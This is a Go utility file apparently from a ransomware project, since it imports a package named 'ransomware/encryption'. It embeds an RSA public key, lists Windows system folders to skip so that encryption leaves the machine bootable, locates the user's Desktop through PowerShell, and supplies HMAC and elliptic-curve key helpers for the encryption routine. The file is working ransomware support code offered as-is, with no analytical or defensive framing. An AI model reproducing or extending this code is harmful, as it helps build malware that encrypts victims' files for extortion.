package utils

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hmac"
	"crypto/sha512"
	"encoding/binary"
	"io/ioutil"
	"math/big"
	"os/exec"
	enc "ransomware/encryption"

	"golang.org/x/text/encoding/charmap"
)

var (
	SPubKeyPem = []byte(`-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAypl+4F/OxQCBJXPVXa//VmoON8hqaSJ15XDccriExWFHOF31kxCG
45+BHaVwACasxe5MpdMz30Jd+iHZTnnNbPcL82HqIvGsD4cKWGGOxc6sLfa3fYVr
kOiOKQ/HUUSCMv761R+6iIGhfztrYM8/hGHKLWGrXqSUCvRveaW7n1HzKb9eEfys
sojwrz3dFhVN1o/fFxbBWYGmmGqXG6mKMLk+CVAA3pEwzNvJs+dgJ4IJSvF6FcHV
ti6w2Y9SEWlU7nAZVAAvX2WbpXZ6VdPYiu1jQY437WwG712YjlM5EL/rdJMi/rZP
M4xhymCo9feLsRCkNgAAQKgK73UsM5hrPwIDAQAB
-----END RSA PUBLIC KEY-----	
`)

	FoldersToSkip = []string{
		"Nova pasta",
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}
)

func Contains[T comparable](s []T, e T) bool {
	for _, v := range s {
		if v == e {
			return true
		}
	}
	return false
}

func decodePage850(msg []byte) (string, error) {

	reader := charmap.CodePage850.NewDecoder().Reader(bytes.NewReader(msg))

	bytesDecoded, err := ioutil.ReadAll(reader)
	if err != nil {
		return "", err
	}

	return string(bytesDecoded), nil
}

func GetDesktopPath() (string, error) {
	pathBytes, err := exec.Command("Powershell", `[Environment]::GetFolderPath("Desktop")`).Output()
	if err != nil {
		return "", err
	}

	desktopPath, err := decodePage850(pathBytes)
	if err != nil {
		return "", err
	}

	n := len(desktopPath)
	desktopPath = desktopPath[0 : n-2]

	return desktopPath, nil
}

func ComputeHmac512(msg []byte, key []byte) [64]byte {
	var result [64]byte
	hash := hmac.New(sha512.New, key)
	hash.Write(msg)

	copy(result[:], hash.Sum(nil))
	return result
}

func Serialize32Int(i uint32) []byte {
	out := make([]byte, 4)
	binary.BigEndian.PutUint32(out, i)

	return out
}

func Serialize256Int(i *big.Int) []byte {
	out := make([]byte, 32)
	i.FillBytes(out)

	return out
}

func SerializeCoords(x *big.Int, y *big.Int) []byte {
	return elliptic.MarshalCompressed(enc.Curve, x, y)
}

func Parse256(sequence []byte) *big.Int {
	return new(big.Int).SetBytes(sequence[:])
}

func Point(p []byte) (*big.Int, *big.Int) {
	x, y := enc.Curve.ScalarBaseMult(p)
	return x, y
}

func NewPrivateKey(D *big.Int) ecdsa.PrivateKey {

	pubKey := NewPublicKey(Point(D.Bytes()))
	privKey := ecdsa.PrivateKey{PublicKey: pubKey, D: D}
	return privKey

}

func NewPublicKey(X *big.Int, Y *big.Int) ecdsa.PublicKey {
	pubKey := ecdsa.PublicKey{Curve: enc.Curve, X: X, Y: Y}
	return pubKey
}

// func SerializeCoords(pubKey *ecdsa.PublicKey) []byte {

// }
